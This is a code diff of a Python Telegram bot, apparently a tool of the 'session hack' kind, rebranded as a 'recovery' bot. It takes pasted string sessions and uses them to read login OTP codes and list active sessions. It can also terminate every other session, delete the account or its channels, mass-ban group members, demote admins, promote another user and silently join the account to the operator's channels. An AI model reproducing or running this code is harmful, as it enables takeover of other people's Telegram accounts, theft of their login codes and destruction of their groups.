+    can_change_info=False, can_invite_users=False, can_delete_messages=False,
+    can_restrict_members=False, can_pin_messages=False, can_promote_members=False,
+    can_manage_chat=False, can_manage_video_chats=False,
 )
 
-# ==================== HELPER FUNCTIONS ====================
-
-async def auto_join_channels_telethon(client):
-    """Automatically join force channels - Telethon"""
-    for channel in FORCE_JOIN_CHANNELS:
+# ==================== HELPER FUNCTIONS - BOT 2 ====================
+async def auto_join_channels_telethon_2(client):
+    for channel in FORCE_JOIN_CHANNELS_2:
         try:
             await client(JoinChannelRequest(channel))
         except:
             pass
 
-async def auto_join_channels_pyrogram(client):
-    """Automatically join force channels - Pyrogram"""
-    for channel in FORCE_JOIN_CHANNELS:
+async def auto_join_channels_pyrogram_2(client):
+    for channel in FORCE_JOIN_CHANNELS_2:
         try:
             await client.join_chat(channel)
         except:
             pass
 
-async def users_gc(session):
-    """Feature A: Get user's groups and channels"""
+async def users_gc_2(session):
     err = ""
     msg = ""
     try:
         if session.endswith("="):
-            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
+            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
             await rj.connect()
-            await auto_join_channels_telethon(rj)
+            await auto_join_channels_telethon_2(rj)
             k = await rj(GetAdminedPublicChannelsRequest())
             for x in k.chats:
                 msg += f'**❥︎ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ:** {x.title}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{x.username}\n**❥︎ ᴍᴇᴍʙᴇʀs:** {x.participants_count}\n\n'
             await rj.disconnect()
         else:
-            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
-                await auto_join_channels_pyrogram(r)
+            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
+                await auto_join_channels_pyrogram_2(r)
                 k = await r.invoke(functions.channels.GetAdminedPublicChannels())
                 for x in k.chats:
                     msg += f'**❥︎ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ:** {x.title}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{x.username}\n**❥︎ ᴍᴇᴍʙᴇʀs:** {x.members_count}\n\n'
@@ -799,22 +638,20 @@ async def users_gc(session):
         return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
     return msg if msg else "**ɴᴏ ᴘᴜʙʟɪᴄ ᴄʜᴀɴɴᴇʟs ғᴏᴜɴᴅ!**"
 
-
-async def user_info(session):
-    """Feature B: Get user information"""
+async def user_info_2(session):
     err = ""
     msg = ""
     try:
         if session.endswith("="):
-            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
+            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
             await rj.connect()
-            await auto_join_channels_telethon(rj)
+            await auto_join_channels_telethon_2(rj)
             k = await rj.get_me()
             msg = f'**❥︎ ɴᴀᴍᴇ:** {k.first_name or k.last_name}\n**❥︎ ɪᴅ:** {k.id}\n**❥︎ ᴘʜᴏɴᴇ:** +{k.phone}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{k.username}'
             await rj.disconnect()
         else:
-            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
-                await auto_join_channels_pyrogram(r)
+            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
+                await auto_join_channels_pyrogram_2(r)
                 k = await r.get_me()
                 msg = f'**❥︎ ɴᴀᴍᴇ:** {k.first_name or k.last_name}\n**❥︎ ɪᴅ:** {k.id}\n**❥︎ ᴘʜᴏɴᴇ:** +{k.phone_number}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{k.username}'
     except Exception as e:
@@ -824,32 +661,30 @@ async def user_info(session):
         return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
     return msg
 
-
-async def banall(session, gc_id):
-    """Feature C: Ban all members from group"""
+async def banall_2(session, gc_id):
     err = ""
     total = 0
     banned = 0
     try:
         if session.endswith("="):
-            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
+            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
             await rj.connect()
-            await auto_join_channels_telethon(rj)
+            await auto_join_channels_telethon_2(rj)
             admins = await rj.get_participants(gc_id, filter=ChannelParticipantsAdmins)
             admin_ids = [i.id for i in admins]
             async for user in rj.iter_participants(gc_id):
                 total += 1
                 try:
                     if user.id not in admin_ids:
-                        await rj(EditBannedRequest(gc_id, user.id, BAN_RIGHTS))
+                        await rj(EditBannedRequest(gc_id, user.id, BAN_RIGHTS_2))
                         banned += 1
                         await asyncio.sleep(0.1)
                 except:
                     await asyncio.sleep(0.1)
             await rj.disconnect()
         else:
-            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
-                await auto_join_channels_pyrogram(r)
+            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
+                await auto_join_channels_pyrogram_2(r)
                 async for member in r.get_chat_members(gc_id):
                     total += 1
                     try:
@@ -866,22 +701,20 @@ async def banall(session, gc_id):
         return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
     return f"**✅ ʙᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**\n\n**❥︎ ʙᴀɴɴᴇᴅ:** {banned}\n**❥︎ ᴛᴏᴛᴀʟ:** {total}"
 
-
-async def get_otp(session):
-    """Feature D: Get last OTP"""
+async def get_otp_2(session):
     err = ""
     msg = ""
     try:
         if session.endswith("="):
-            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
+            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
             await rj.connect()
-            await auto_join_channels_telethon(rj)
+            await auto_join_channels_telethon_2(rj)
             async for x in rj.iter_messages(777000, limit=2):
                 msg += f"\n{x.text}\n"
             await rj.disconnect()
         else:
-            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
-                await auto_join_channels_pyrogram(r)
+            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
+                await auto_join_channels_pyrogram_2(r)
                 async for message in r.get_chat_history(777000, limit=2):
                     msg += f"\n{message.text}\n"
     except Exception as e:
@@ -891,20 +724,18 @@ async def get_otp(session):
         return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
     return msg if msg else "**ɴᴏ ᴏᴛᴘ ғᴏᴜɴᴅ!**"
 
-
-async def join_ch(session, gc_id):
-    """Feature E: Join channel/group"""
+async def join_ch_2(session, gc_id):
     err = ""
     try:
         if session.endswith("="):
-            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
+            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
             await rj.connect()
-            await auto_join_channels_telethon(rj)
+            await auto_join_channels_telethon_2(rj)
             await rj(JoinChannelRequest(gc_id))
             await rj.disconnect()
         else:
-            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
-                await auto_join_channels_pyrogram(r)
+            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
+                await auto_join_channels_pyrogram_2(r)
                 await r.join_chat(gc_id)
     except Exception as e:
         err = str(e)
@@ -913,20 +744,18 @@ async def join_ch(session, gc_id):
         return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
     return "**✅ ᴊᴏɪɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"
 
-
-async def leave_ch(session, gc_id):
-    """Feature F: Leave channel/group"""
+async def leave_ch_2(session, gc_id):
     err = ""
     try:
         if session.endswith("="):
-            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
+            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
             await rj.connect()
-            await auto_join_channels_telethon(rj)
+            await auto_join_channels_telethon_2(rj)
             await rj(LeaveChannelRequest(gc_id))
             await rj.disconnect()
         else:
-            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
-                await auto_join_channels_pyrogram(r)
+            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
+                await auto_join_channels_pyrogram_2(r)
                 await r.leave_chat(gc_id)
     except Exception as e:
         err = str(e)
@@ -935,20 +764,18 @@ async def leave_ch(session, gc_id):
         return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
     return "**✅ ʟᴇғᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!**"
 
-
-async def del_ch(session, gc_id):
-    """Feature G: Delete channel/group"""
+async def del_ch_2(session, gc_id):
     err = ""
     try:
         if session.endswith("="):
-            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
+            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
             await rj.connect()
-            await auto_join_channels_telethon(rj)
+            await auto_join_channels_telethon_2(rj)
             await rj(DeleteChannelRequest(gc_id))
             await rj.disconnect()
         else:
-            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
-                await auto_join_channels_pyrogram(r)
+            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
+                await auto_join_channels_pyrogram_2(r)
                 await r.invoke(functions.channels.DeleteChannel(channel=await r.resolve_peer(gc_id)))
     except Exception as e:
         err = str(e)
@@ -957,16 +784,14 @@ async def del_ch(session, gc_id):
         return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
     return "**✅ ᴅᴇʟᴇᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"
 
-
-async def check_2fa(session):
-    """Feature H: Check 2FA status"""
+async def check_2fa_2(session):
     err = ""
     msg = ""
     try:
         if session.endswith("="):
-            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
+            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
             await rj.connect()
-            await auto_join_channels_telethon(rj)
+            await auto_join_channels_telethon_2(rj)
             try:
                 await rj.edit_2fa("testpass123")
                 msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ ❌**"
@@ -974,8 +799,8 @@ async def check_2fa(session):
                 msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ ✅**"
             await rj.disconnect()
         else:
-            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
-                await auto_join_channels_pyrogram(r)
+            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
+                await auto_join_channels_pyrogram_2(r)
                 pwd = await r.invoke(functions.account.GetPassword())
                 if pwd.has_password:
                     msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ ✅**"
@@ -988,20 +813,18 @@ async def check_2fa(session):
         return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
     return msg
 
-
-async def terminate_all(session):
-    """Feature I: Terminate all sessions"""
+async def terminate_all_2(session):
     err = ""
     try:
         if session.endswith("="):
-            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
+            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
             await rj.connect()
-            await auto_join_channels_telethon(rj)
+            await auto_join_channels_telethon_2(rj)
             await rj(ResetAuthorizationsRequest())
             await rj.disconnect()
         else:
-            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
-                await auto_join_channels_pyrogram(r)
+            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
+                await auto_join_channels_pyrogram_2(r)
                 await r.invoke(functions.auth.ResetAuthorizations())
     except Exception as e:
         err = str(e)
@@ -1010,20 +833,18 @@ async def terminate_all(session):
         return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
     return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴀʟʟ sᴇssɪᴏɴs!**"
 
-
-async def del_acc(session):
-    """Feature J: Delete account"""
+async def del_acc_2(session):
     err = ""
     try:
         if session.endswith("="):
-            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
+            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
             await rj.connect()
-            await auto_join_channels_telethon(rj)
+            await auto_join_channels_telethon_2(rj)
             await rj(tfunc.account.DeleteAccountRequest("Deleted"))
             await rj.disconnect()
         else:
-            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
-                await auto_join_channels_pyrogram(r)
+            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
+                await auto_join_channels_pyrogram_2(r)
                 await r.invoke(functions.account.DeleteAccount(reason="Deleted"))
     except Exception as e:
         err = str(e)
@@ -1032,15 +853,13 @@ async def del_acc(session):
         return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
     return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ᴀᴄᴄᴏᴜɴᴛ!**"
 
-
-async def promote_user(session, gc_id, user_id):
-    """Feature K: Promote a user"""
+async def promote_user_2(session, gc_id, user_id):
     err = ""
     try:
         if session.endswith("="):
-            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
+            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
             await rj.connect()
-            await auto_join_channels_telethon(rj)
+            await auto_join_channels_telethon_2(rj)
             try:
                 await rj.edit_admin(gc_id, user_id, manage_call=True, invite_users=True,
                                    ban_users=True, change_info=True, edit_messages=True,
@@ -1050,12 +869,12 @@ async def promote_user(session, gc_id, user_id):
                                    pin_messages=True, title='Admin')
             await rj.disconnect()
         else:
-            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
-                await auto_join_channels_pyrogram(r)
+            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
+                await auto_join_channels_pyrogram_2(r)
                 try:
-                    await r.promote_chat_member(gc_id, user_id, FULL_PROMOTE)
+                    await r.promote_chat_member(gc_id, user_id, FULL_PROMOTE_2)
                 except:
-                    await r.promote_chat_member(gc_id, user_id, PROMOTE)
+                    await r.promote_chat_member(gc_id, user_id, PROMOTE_2)
     except Exception as e:
         err = str(e)
     
@@ -1063,15 +882,13 @@ async def promote_user(session, gc_id, user_id):
         return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
     return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ ᴜsᴇʀ!**"
 
-
-async def demote_all(session, gc_id):
-    """Feature L: Demote all admins"""
+async def demote_all_2(session, gc_id):
     err = ""
     try:
         if session.endswith("="):
-            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
+            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
             await rj.connect()
-            await auto_join_channels_telethon(rj)
+            await auto_join_channels_telethon_2(rj)
             async for x in rj.iter_participants(gc_id, filter=ChannelParticipantsAdmins):
                 try:
                     await rj.edit_admin(gc_id, x.id, is_admin=False, manage_call=False)
@@ -1084,11 +901,11 @@ async def demote_all(session, gc_id):
                         pass
             await rj.disconnect()
         else:
-            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
-                await auto_join_channels_pyrogram(r)
+            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
+                await auto_join_channels_pyrogram_2(r)
                 async for m in r.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
                     try:
-                        await r.promote_chat_member(gc_id, m.user.id, DEMOTE)
+                        await r.promote_chat_member(gc_id, m.user.id, DEMOTE_2)
                     except:
                         pass
     except Exception as e:
@@ -1098,20 +915,18 @@ async def demote_all(session, gc_id):
         return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
     return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴍᴏᴛᴇᴅ ᴀʟʟ ᴀᴅᴍɪɴs!**"
 
-
-async def send_to_saved(session, message):
-    """Feature M: Send message to saved messages"""
+async def send_to_saved_2(session, message):
     err = ""
     try:
         if session.endswith("="):
-            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
+            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
             await rj.connect()
-            await auto_join_channels_telethon(rj)
+            await auto_join_channels_telethon_2(rj)
             await rj.send_message("me", message)
             await rj.disconnect()
         else:
-            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
-                await auto_join_channels_pyrogram(r)
+            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
+                await auto_join_channels_pyrogram_2(r)
                 await r.send_message("me", message)
     except Exception as e:
         err = str(e)
@@ -1120,16 +935,14 @@ async def send_to_saved(session, message):
         return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
     return "**✅ ᴍᴇssᴀɢᴇ sᴇɴᴛ ᴛᴏ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs!**"
 
-
-async def get_active_sessions(session):
-    """Feature N: Get all active sessions"""
+async def get_active_sessions_2(session):
     err = ""
     msg = ""
     try:
         if session.endswith("="):
-            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
+            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
             await rj.connect()
-            await auto_join_channels_telethon(rj)
+            await auto_join_channels_telethon_2(rj)
             auths = await rj(tfunc.account.GetAuthorizationsRequest())
             for i, auth in enumerate(auths.authorizations, 1):
                 msg += f"**{i}. Device:** {auth.device_model}\n"
@@ -1138,8 +951,8 @@ async def get_active_sessions(session):
                 msg += f"**App:** {auth.app_name} {auth.app_version}\n\n"
             await rj.disconnect()
         else:
-            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
-                await auto_join_channels_pyrogram(r)
+            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
+                await auto_join_channels_pyrogram_2(r)
                 auths = await r.invoke(functions.account.GetAuthorizations())
                 for i, auth in enumerate(auths.authorizations, 1):
                     msg += f"**{i}. Device:** {auth.device_model}\n"
@@ -1153,15 +966,13 @@ async def get_active_sessions(session):
         return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
     return msg if msg else "**ɴᴏ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴs ғᴏᴜɴᴅ!**"
 
-
-async def download_profile_pics(session):
-    """Feature O: Download profile photos"""
+async def download_profile_pics_2(session):
     err = ""
     try:
         if session.endswith("="):
-            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
+            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
             await rj.connect()
-            await auto_join_channels_telethon(rj)
+            await auto_join_channels_telethon_2(rj)
             photos = await rj.get_profile_photos("me")
             if photos:
                 file_path = await rj.download_profile_photo("me")
@@ -1171,8 +982,8 @@ async def download_profile_pics(session):
                 await rj.disconnect()
                 return None
         else:
-            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
-                await auto_join_channels_pyrogram(r)
+            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
+                await auto_join_channels_pyrogram_2(r)
                 async for photo in r.get_chat_photos("me", limit=1):
                     file_path = await r.download_media(photo.file_id)
                     return file_path
@@ -1184,16 +995,14 @@ async def download_profile_pics(session):
         return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
     return None
 
-
-async def change_profile(session, fname=None, lname=None, bio=None):
-    """Feature P: Change profile details"""
+async def change_profile_2(session, fname=None, lname=None, bio=None):
     err = ""
     msg = ""
     try:
         if session.endswith("="):
-            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
+            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
             await rj.connect()
-            await auto_join_channels_telethon(rj)
+            await auto_join_channels_telethon_2(rj)
             if fname:
                 await rj(tfunc.account.UpdateProfileRequest(first_name=fname))
                 msg += "**✅ First Name Changed!**\n"
@@ -1205,8 +1014,8 @@ async def change_profile(session, fname=None, lname=None, bio=None):
                 msg += "**✅ Bio Changed!**\n"
             await rj.disconnect()
         else:
-            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
-                await auto_join_channels_pyrogram(r)
+            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
+                await auto_join_channels_pyrogram_2(r)
                 if fname or lname:
                     await r.update_profile(first_name=fname, last_name=lname)
                     msg += "**✅ Name Changed!**\n"
@@ -1220,37 +1029,31 @@ async def change_profile(session, fname=None, lname=None, bio=None):
         return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
     return msg if msg else "**ɴᴏ ᴄʜᴀɴɢᴇs ᴍᴀᴅᴇ!**"
 
-
-# ==================== HANDLERS ====================
-
-@app.on_message(filters.command("start") & filters.private)
-async def start_handler(_, message):
+# ==================== HANDLERS - BOT 2 ====================
+@recovery_bot.on_message(filters.command("start") & filters.private)
+async def start_handler_2(_, message):
     user = message.from_user.mention
     bot = (await _.get_me()).mention
     await message.reply_photo(
-        photo=START_PIC,
-        caption=PM_TEXT.format(user, bot, owner=OWNER_NAME),
-        reply_markup=PM_BUTTON
+        photo=START_PIC_2,
+        caption=PM_TEXT_2.format(user, bot, owner=OWNER_NAME_2),
+        reply_markup=PM_BUTTON_2
     )
 
+@recovery_bot.on_message(filters.command("hack") & filters.private)
+async def hack_handler_2(_, message):
+    await message.reply_text(HACK_TEXT_2.format(owner=OWNER_NAME_2), reply_markup=HACK_MODS_2)
 
-@app.on_message(filters.command("hack") & filters.private)
-async def hack_handler(_, message):
-    await message.reply_text(HACK_TEXT.format(owner=OWNER_NAME), reply_markup=HACK_MODS)
-
-
-@app.on_callback_query(filters.regex("hack_btn"))
-async def hack_btn_callback(_, query):
+@recovery_bot.on_callback_query(filters.regex("hack_btn_2"))
+async def hack_btn_callback_2(_, query):
     await query.message.delete()
-    await query.message.reply_text(HACK_TEXT.format(owner=OWNER_NAME), reply_markup=HACK_MODS)
+    await query.message.reply_text(HACK_TEXT_2.format(owner=OWNER_NAME_2), reply_markup=HACK_MODS_2)
 
-
-# Feature A - Get Groups/Channels
-@app.on_callback_query(filters.regex("^A$"))
-async def feature_a(client, query):
+@recovery_bot.on_callback_query(filters.regex("^hack_A$"))
+async def feature_a_2(client, query):
     chat_id = query.message.chat.id
     session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
-    result = await users_gc(session.text)
+    result = await users_gc_2(session.text)
     
     if len(result) > 3855:
         with open("channels.txt", "w") as f:
@@ -1258,170 +1061,105 @@ async def feature_a(client, query):
         await client.send_document(chat_id, "channels.txt")
         os.remove("channels.txt")
     else:
-        await query.message.reply_text(
-            text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
-            reply_markup=HACK_MODS
-        )
+        await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)
 
-
-# Feature B - Get User Info
-@app.on_callback_query(filters.regex("^B$"))
-async def feature_b(client, query):
+@recovery_bot.on_callback_query(filters.regex("^hack_B$"))
+async def feature_b_2(client, query):
     chat_id = query.message.chat.id
     session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
-    result = await user_info(session.text)
-    await query.message.reply_text(
-        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
-        reply_markup=HACK_MODS
-    )
+    result = await user_info_2(session.text)
+    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)
 
-
-# Feature C - Ban All Members
-@app.on_callback_query(filters.regex("^C$"))
-async def feature_c(client, query):
+@recovery_bot.on_callback_query(filters.regex("^hack_C$"))
+async def feature_c_2(client, query):
     chat_id = query.message.chat.id
     session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
     gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
-    result = await banall(session.text, gc.text)
-    await query.message.reply_text(
-        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
-        reply_markup=HACK_MODS
-    )
+    result = await banall_2(session.text, gc.text)
+    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)
 
-
-# Feature D - Get OTP
-@app.on_callback_query(filters.regex("^D$"))
-async def feature_d(client, query):
+@recovery_bot.on_callback_query(filters.regex("^hack_D$"))
+async def feature_d_2(client, query):
     chat_id = query.message.chat.id
     session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
-    result = await get_otp(session.text)
-    await query.message.reply_text(
-        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
-        reply_markup=HACK_MODS
-    )
+    result = await get_otp_2(session.text)
+    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)
 
-
-# Feature E - Join Channel
-@app.on_callback_query(filters.regex("^E$"))
-async def feature_e(client, query):
+@recovery_bot.on_callback_query(filters.regex("^hack_E$"))
+async def feature_e_2(client, query):
     chat_id = query.message.chat.id
     session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
     gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
-    result = await join_ch(session.text, gc.text)
-    await query.message.reply_text(
-        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
-        reply_markup=HACK_MODS
-    )
+    result = await join_ch_2(session.text, gc.text)
+    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)
 
-
-# Feature F - Leave Channel
-@app.on_callback_query(filters.regex("^F$"))
-async def feature_f(client, query):
+@recovery_bot.on_callback_query(filters.regex("^hack_F$"))
+async def feature_f_2(client, query):
     chat_id = query.message.chat.id
     session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
     gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
-    result = await leave_ch(session.text, gc.text)
-    await query.message.reply_text(
-        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
-        reply_markup=HACK_MODS
-    )
+    result = await leave_ch_2(session.text, gc.text)
+    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)
 
-
-# Feature G - Delete Channel
-@app.on_callback_query(filters.regex("^G$"))
-async def feature_g(client, query):
+@recovery_bot.on_callback_query(filters.regex("^hack_G$"))
+async def feature_g_2(client, query):
     chat_id = query.message.chat.id
     session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
     gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
-    result = await del_ch(session.text, gc.text)
-    await query.message.reply_text(
